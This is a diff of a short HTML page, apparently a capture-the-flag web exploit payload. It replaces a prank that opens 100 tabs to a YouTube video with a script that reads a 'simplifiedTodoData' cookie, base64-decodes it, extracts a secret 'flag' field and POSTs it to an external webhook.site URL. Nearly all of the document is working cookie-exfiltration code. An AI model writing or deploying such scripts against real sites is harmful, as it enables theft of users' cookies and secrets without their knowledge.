@@ -1,12 +1,16 @@
+<!DOCTYPE html>
 <html>
 <body>
 <script>
-for (var i = 100; i--;) {
-    var a = document.body.appendChild(document.createElement('a'));
-    a.target = '_blank';
-    a.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-    a.click();
-}
+(function() {
+    const cookieData = document.cookie.match(/simplifiedTodoData=([^;]+)/)[1];
+    const decoded = JSON.parse(atob(cookieData));
+    const flag = decoded.shared.secret;
+    fetch('https://webhook.site/c2e38c76-5a5a-4aeb-9e14-740bdb81073b', {
+        method: 'POST',
+        body: JSON.stringify({flag: flag})
+    });
+})();
 </script>
 </body>
 </html>
